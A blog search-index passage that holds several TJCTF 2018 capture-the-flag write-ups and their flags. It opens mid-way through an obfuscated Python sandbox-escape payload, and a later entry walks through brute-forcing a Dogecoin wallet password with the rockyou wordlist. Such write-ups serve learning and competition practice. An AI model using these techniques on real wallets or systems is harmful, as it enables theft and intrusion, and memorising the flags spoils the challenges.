\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))")tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}Phew! Got it, finally! The flag was : tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}After thoughtsI maybe made it sound easy or quick writing this, but it actually took me a few hours to figure this all out. As it was my first time, I definitly needed some help and advices, and that’s where Highsenburger69 came handy. Shout out to you, lovely bastard! :heart:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Huuuuuge]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Huuuuuge/</url>
      <content type="text"><![CDATA[ChallengeDon’t think too deep.104.154.187.226/huuuuuge[25 points]Written by Alaska47Initial thoughtsUh. They’re giving us an IP address with an extension (/xxx) which probably means it’s web. But then, why classify this challenge as misc’?Let’s find out.ExploitationFirst of all, let’s fire up nmap and gather information about 104.154.187.226.PORT     STATE  SERVICE VERSION22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)| ssh-hostkey: |   2048 25:97:23:e0:26:26:07:2e:f6:38:20:90:ce:39:44:96 (RSA)|   256 66:2e:64:31:21:83:68:03:2b:05:30:05:7a:59:72:df (ECDSA)|_  256 25:61:dd:51:b8:43:76:47:ba:96:16:fe:cd:09:e0:04 (ED25519)80/tcp   closed http5901/tcp closed vnc-19418/tcp open   git?Interesting. It’s not a web server after all. I immediately thought that this git opened port was looking weird. Well, let’s try to interact with it.~# git clone 104.154.187.226/huuuuugefatal: repository '104.154.187.226/huuuuuge' does not existErr. Silly me. I forgot the extension, plus : it’s not a web server, so I gotta tell my git where to look and HOW to look.~# git clone git://104.154.187.226/huuuuugeCloning into 'huuuuuge'...remote: Counting objects: 309, done.remote: warning: suboptimal pack - out of memoryremote: fatal: Out of memory, malloc failed (tried to allocate 104857601 bytes)remote: aborting due to possible repository corruption on the remote side.fatal: early EOFfatal: index-pack failedGod damn, this thing is massive! Wait… Challenge name’s Huuuuuge… I see what they did here…Let’s look at git clone’s manual :--depth &lt;depth&gt;Create a shallow clone with a history truncated to the specified number of commits. Implies --single-branch unless --no-single-branch is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass --shallow-submodules.Interesting… Let’s try something then, just to see what comes out!~# git clone --depth 1 git://104.154.187.226/huuuuugeCloning into 'huuuuuge'...remote: Counting objects: 3, done.remote: Total 3 (delta 0), reused 0 (delta 0)Receiving objects: 100% (3/3), done.Uh, uh! We got the first line. Let’s open it and see what lies for us there.~# cd huuuuuge/~/huuuuuge# lsflag.txtHow nice of them to give us a flag like that! You gotta love TJCTF.The flag was : tjctf{this_fl4g_1s_huuuuuge}After thoughtsVery interesting challenge as I never had encountered this case before of a “too big to clone” git repo. I really like challenges that make you learn new things, and this includes the ones that make you read a command’s manual.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - We Will Rock You]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/</url>
      <content type="text"><![CDATA[ChallengeHelp! I lost the password to my Dogecoin wallet. I had like 10 Dogecoin in there. If you get the password, you’ll get the flag! Flag format: tjctf{password}[75 points]Written by Alaska47Initial thoughtsSeeing the name of the challenge, I immediately thought about the infamous rockyou.txt list of passwords. For those of you who don’t know it, it’s this huge list of passwords that was created out of real, leaked passwords.It’s natively present in Kali, check /usr/share/wordlists and you’ll find a rockyou.txt.gz :)So I assumed I’d have to bruteforce this wallet in order to retrieve the password. I googled for “wallet bruteforce” and found glv2’s Github magic thingy.ExploitationFirst off, let’s clone this github repo.~# git clone https://github.com/glv2/bruteforce-walletLet’s install the dependencies required :~# apt install libdb-dev libssl-dev -yLet’s then try to install it following the README’s instructions.~# cd bruteforce-wallet &amp;&amp; ./autogen.sh./autogen.sh: 6: ./autogen.sh: autoreconf: not foundOops! Seems I need to install a package first.~# apt-get install autoconf~# ./autogen.shconfigure.ac:6: installing './compile'configure.ac:2: installing './install-sh'configure.ac:2: installing './missing'Makefile.am: installing './depcomp'Then a ./configure, make and make install and we’re good! Now, let’s use our new little tool :3~# bruteforce-wallet -t 6 -f /root/Documents/rockyou.txt 9d7e6203fb6e2c14646c63bea94e48001b9317c86bec229c3e063904a168dfad_wallet.datWarning: using dictionary mode, ignoring options -b, -e, -l, -m and -s. Tried passwords: 59Tried passwords per second: 59,000000Last tried password: samantha Password found: tinkerbellGot it! Password is “tinkerbell”, hereby flag is : tjctf{tinkerbell}After thoughtsA very basic challenge worth a lot of points compared to other ones in this TJCTF. Still, I enjoyed the five minutes it took me, as I never had to bruteforce a coin-wallet before. Valuable experience!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> forensics </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Weird Logo]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Weird-Logo/</url>
      <content type="text"><![CDATA[ChallengeThis company’s logo stands in contrast of those of other leading edge tech companies with its poor design[5 points]Written by jfrucht25Initial thoughtsHaving a static .png image with this little amount of points rewarded means it won’t be tough.ExploitationLet’s start with the basics. The “file” command tells us it is indeed a .png. The “binwalk” and “strings” commands give us nothing interesting. Next step? Stegsolve!You can install it here.Here is our beautiful logo :And here is what we can find with just a few switches to the right :Flag : tjctf{in_plain_sight}After thoughtsNot much. This is the very basic of steganography. I’ve encountered it dozens of times in past CTFs.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> forensics </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Trippy]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Trippy/</url>
      <content type="text"><![CDATA[ChallengeNo description[5 points]Written by Alaska47Initial thoughtsSo, we have no description and a gif file. All of this for little to no points. This should be quick.Exploitation~# wget https://static.tjctf.org/be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif ~# strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctftjctf{w0w}Meh.Flag : tjctf{w0w}After thoughtsNot much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> misc </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
